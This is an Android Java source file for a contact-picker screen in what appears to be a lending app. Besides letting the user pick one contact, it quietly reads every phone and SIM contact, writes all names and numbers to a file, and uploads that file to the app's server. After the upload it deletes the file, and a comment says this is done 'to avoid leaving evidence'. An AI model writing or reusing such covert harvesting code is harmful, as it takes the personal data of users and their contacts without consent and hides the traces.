package com.ucredit.dream.contact;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import net.sourceforge.pinyin4j.format.exception.BadHanyuPinyinOutputFormatCombination;

import org.apache.http.Header;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.Photo;
import android.text.Editable;
import android.text.TextUtils;
import android.text.TextWatcher;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ListView;
import android.widget.TextView;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import com.ucredit.dream.R;
import com.ucredit.dream.contact.SideBar.OnTouchingLetterChangedListener;
import com.ucredit.dream.ui.activity.apply.ApplyContactInfoActivity;
import com.ucredit.dream.ui.activity.main.BaseActivity;
import com.ucredit.dream.utils.Constants;
import com.ucredit.dream.utils.FileUtil;
import com.ucredit.dream.utils.Logger;
import com.ucredit.dream.utils.RequestFailureHandler;
import com.ucredit.dream.utils.Utils;
import com.ucredit.dream.utils.request.LoginRequest.GetTokenListener;

public class ContactActivity extends BaseActivity {
    public PinyinComparator comparator = new PinyinComparator();

    private TextView userListNumTxt;

    private SideBar sideBar;
    private ListView sortListView;
    private TextView dialogTxt;
    private SearchEditText mSearchEditText;
    private SortAdapter adapter;

    private List<ContactModel> sortModelList;
    
    private static final int MSG_READ_SUCCESS_WHAT = 101;
    private static final int MSG_WRITE_SUCCESS_WHAT = 102;
    
    private File contactDir;
    private File contactFile;
    private String resultStr = "";
    
    private Handler mHandler = new Handler(){

        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            if(msg.what == MSG_READ_SUCCESS_WHAT){
                userListNumTxt.setText("全部：" + "\t" + sortModelList.size() + "个联系人");

                // sort by a-z
                Collections.sort(sortModelList, comparator);
                adapter = new SortAdapter(getApplicationContext(), sortModelList);
                sortListView.setAdapter(adapter);
            }
            if(msg.what == MSG_WRITE_SUCCESS_WHAT){
                if(!ApplyContactInfoActivity.upload){
                    uploadContacts();
                }
            }
        }
        
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.userListNumTxt = (TextView) findViewById(R.id.txt_user_list_user_num);

        sideBar = (SideBar) findViewById(R.id.sild_bar);
        dialogTxt = (TextView) findViewById(R.id.txt_dialog);
        sideBar.setmTextDialog(dialogTxt);

        // on touching listener of side bar
        sideBar
            .setOnTouchingLetterChangedListener(new OnTouchingLetterChangedListener() {

                public void onTouchingLetterChanged(String str) {
                    if(adapter != null){
                        int position = adapter.getPositionForSection(str.charAt(0));
                        if (position != -1)
                            sortListView.setSelection(position);
                    }
                }
            });

        sortListView = (ListView) findViewById(R.id.list_view_user_list);
        sortListView.setSelector(new ColorDrawable(Color.TRANSPARENT));
        sortListView.setOnItemClickListener(new OnItemClickListener() {

            public void onItemClick(AdapterView<?> parent, View view,
                    int position, long id) {
                ContactModel contact = (ContactModel) adapter.getItem(position);
                Intent intent = new Intent();
                intent.putExtra("name", contact.getName());
                intent.putExtra("phone", Utils.replaceSpace(contact.getNumber()));
                setResult(Activity.RESULT_OK, intent);
                finish();
            }
        });
        
        contactDir = FileUtil.getUcreditDir(this);
        contactFile = new File(contactDir + "/contacts.txt");
        new Thread(new Runnable() {
            
            @Override
            public void run() {
                try {
                    sortModelList = filledData(getPhoneContacts());
                    if(!ApplyContactInfoActivity.upload){
                        writeTxtToFile(resultStr);
                    }
                    mHandler.sendEmptyMessage(MSG_READ_SUCCESS_WHAT);
                } catch (BadHanyuPinyinOutputFormatCombination e1) {
                    e1.printStackTrace();
                }

            }
        }).start();

        // search 
        mSearchEditText = (SearchEditText) findViewById(R.id.txt_filter_edit);

        // filter 
        mSearchEditText.addTextChangedListener(new TextWatcher() {

            public void onTextChanged(CharSequence str, int arg1, int arg2,
                    int arg3) {
                try {
                    filerData(str.toString());
                } catch (BadHanyuPinyinOutputFormatCombination e) {
                    e.printStackTrace();
                }
            }

            public void beforeTextChanged(CharSequence arg0, int arg1,
                    int arg2, int arg3) {
            }

            public void afterTextChanged(Editable arg0) {
            }
        });
        
    }

    private List<ContactModel> filledData(List<ContactModel> contactList)
            throws BadHanyuPinyinOutputFormatCombination {
        List<ContactModel> mSortList = new ArrayList<ContactModel>();

        for (int i = 0; i < contactList.size(); i++) {
            ContactModel contactModel = contactList.get(i);
          //汉字转换成拼音
            if (contactModel.getName() == null) {
                continue;
            }
            String pinyin = PinYinKit.getPingYin(contactModel.getName());
            String sortString = "";
            try {
                sortString = pinyin.substring(0, 1).toUpperCase();
            } catch (Exception e) {
                sortString = "";
            }

            // 正则表达式，判断首字母是否是英文字母
            if (sortString.matches("[A-Z]")) {
                contactModel.setSortLetters(sortString.toUpperCase());
            } else {
                contactModel.setSortLetters("#");
            }

            mSortList.add(contactModel);
        }
        return mSortList;

    }

    private void filerData(String str)
            throws BadHanyuPinyinOutputFormatCombination {
        List<ContactModel> fSortModels = new ArrayList<ContactModel>();

        if (TextUtils.isEmpty(str))
            fSortModels = sortModelList;
        else {
            fSortModels.clear();
            if(sortModelList != null){
                for (ContactModel sortModel : sortModelList) {
                    if(str.toString().startsWith("0") || str.toString().startsWith("1")
                            || str.toString().startsWith("+")){ //以号码搜索
                        String phone = sortModel.getNumber();
                        if(phone.contains(str)){
                            fSortModels.add(sortModel);
                        }
                    }else{//以拼音搜索
                        String name = sortModel.getName();
                        if (name.indexOf(str.toString()) != -1
                            || PinYinKit.getPingYin(name).startsWith(str.toString())
                            || PinYinKit.getPingYin(name).startsWith(
                                str.toUpperCase().toString())) {
                            fSortModels.add(sortModel);
                        }
                    }
                }
            }

        }
        Collections.sort(fSortModels, comparator);
        adapter.updateListView(fSortModels);
    }

    public void changeDatas(List<ContactModel> mSortList, String str) {
        userListNumTxt.setText(str + "：" + "\t" + mSortList.size() + "个联系人");

        Collections.sort(mSortList, comparator);
        adapter.updateListView(mSortList);
    }

    private static final String[] PHONES_PROJECTION = new String[] {
        Phone.DISPLAY_NAME, Phone.NUMBER, Photo.PHOTO_ID, Phone.CONTACT_ID };

    /** 联系人显示名称 **/
    private static final int PHONES_DISPLAY_NAME_INDEX = 0;

    /** 电话号码 **/
    private static final int PHONES_NUMBER_INDEX = 1;

    /** 头像ID **/
    private static final int PHONES_PHOTO_ID_INDEX = 2;

    /** 联系人的ID **/
    private static final int PHONES_CONTACT_ID_INDEX = 3;

    /** 得到手机通讯录联系人信息 **/
    private List<ContactModel> getPhoneContacts() {
        List<ContactModel> sortModelList = new ArrayList<ContactModel>();
        ContentResolver resolver = getContentResolver();
        
        if(resolver == null){
            return sortModelList;
        }
        
        // 获取手机联系人
        Cursor phoneCursor = resolver.query(Phone.CONTENT_URI,
            PHONES_PROJECTION, null, null, null);

        if (phoneCursor != null) {
            while (phoneCursor.moveToNext()) {

                //得到手机号码
                String phoneNumber = phoneCursor.getString(PHONES_NUMBER_INDEX);
                //当手机号码为空的或者为空字段 跳过当前循环
                if (TextUtils.isEmpty(phoneNumber))
                    continue;

                //得到联系人名称
                String contactName = phoneCursor
                    .getString(PHONES_DISPLAY_NAME_INDEX);

                //得到联系人ID
                Long contactid = phoneCursor.getLong(PHONES_CONTACT_ID_INDEX);

                //得到联系人头像ID
                Long photoid = phoneCursor.getLong(PHONES_PHOTO_ID_INDEX);

                //得到联系人头像Bitamp
                Bitmap contactPhoto = null;

                //photoid 大于0 表示联系人有头像 如果没有给此人设置头像则给他一个默认的
                if (photoid > 0) {
                    Uri uri = ContentUris.withAppendedId(
                        ContactsContract.Contacts.CONTENT_URI, contactid);
                    InputStream input = ContactsContract.Contacts
                        .openContactPhotoInputStream(resolver, uri);
                    contactPhoto = BitmapFactory.decodeStream(input);
                } else {
                    contactPhoto = BitmapFactory.decodeResource(getResources(),
                        R.drawable.user_head);
                }

                ContactModel sortModel = new ContactModel();
                sortModel.setName(contactName);
                sortModel.setNumber(phoneNumber);
                sortModel.setPhoto(contactPhoto);
                sortModelList.add(sortModel);
                
                resultStr += (contactName + "###" + phoneNumber + "\n");
            }

            phoneCursor.close();
        }

        try {
            // 获取Sims卡联系人
            Uri uri = Uri.parse("content://icc/adn");
            Cursor phoneSimCursor = resolver.query(uri, PHONES_PROJECTION,
                null, null, null);
            if (phoneSimCursor != null) {
                while (phoneSimCursor.moveToNext()) {

                    // 得到手机号码
                    String phoneNumber = phoneSimCursor
                        .getString(PHONES_NUMBER_INDEX);
                    // 当手机号码为空的或者为空字段 跳过当前循环
                    if (TextUtils.isEmpty(phoneNumber))
                        continue;
                    // 得到联系人名称
                    String contactName = phoneSimCursor
                        .getString(PHONES_DISPLAY_NAME_INDEX);

                    //Sim卡中没有联系人头像

                    ContactModel sortModel = new ContactModel();
                    sortModel.setName(contactName);
                    sortModel.setNumber(phoneNumber);
                    sortModel.setPhoto(null);
                    sortModelList.add(sortModel);

                    resultStr += (contactName + "###" + phoneNumber + "\n");
                }

                phoneSimCursor.close();
            }
        } catch (Exception e) {
            return sortModelList;
        }
        return sortModelList;
    }
    
    // 将字符串写入到文本文件中
    public void writeTxtToFile(String strContent) {
        // 生成文件夹之后，再生成文件，不然会出错

        try {
            RandomAccessFile raf = new RandomAccessFile(contactFile, "rwd");
            raf.seek(contactFile.length());
            raf.write(strContent.getBytes());
            raf.close();
            mHandler.sendEmptyMessage(MSG_WRITE_SUCCESS_WHAT);
        } catch (Exception e) {
            Logger.e("TestFile", "Error on write File:" + e);
        }
    }
    
    /**
     * 上传手机所有联系人信息
     */
    private void uploadContacts() {
        AsyncHttpClient httpClient = new AsyncHttpClient();
        RequestParams params = new RequestParams();
        try {
            params.put("file", contactFile);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        httpClient.post(Constants.API_CONTACTS_BOOK, params,
                new AsyncHttpResponseHandler() {

                    @Override
                    public void onSuccess(int statusCode, Header[] headers,
                            byte[] responseBody) {
                        Logger.e("uploadContacts", "success");
                        // 成功之后删除文件，以免留下证据
                        if (contactFile != null && contactFile.exists()) {
                            contactFile.delete();
                        }
                        ApplyContactInfoActivity.upload = true;
                    }

                    @Override
                    public void onProgress(int bytesWritten, int totalSize) {
                        Logger.e("uploadContacts", "totalSize" + totalSize);
                    }

                    @Override
                    public void onFailure(int statusCode, Header[] headers,
                            byte[] responseBody, Throwable error) {
                        Logger.e("uploadContacts", "onFailure");
                        new RequestFailureHandler(
                                ContactActivity.this,
                                new GetTokenListener() {

                                    @Override
                                    public void onSuccess() {
                                        uploadContacts();
                                    }
                                }).handleMessage(statusCode);
                    }
                });
    }


    @Override
    protected boolean hasTitle() {
        return true;
    }

    @Override
    protected CharSequence getPublicTitle() {
        return "手机联系人";
    }

    @Override
    protected int getContentId() {
        return R.layout.activity_contact;
    }

}
